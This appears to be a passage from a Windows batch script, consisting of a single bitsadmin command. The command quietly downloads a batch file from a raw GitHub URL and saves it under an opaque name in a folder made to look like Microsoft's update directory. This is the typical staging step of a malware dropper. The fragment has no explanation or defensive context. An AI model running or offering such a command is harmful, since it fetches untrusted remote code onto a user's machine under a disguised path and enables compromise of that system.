...
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
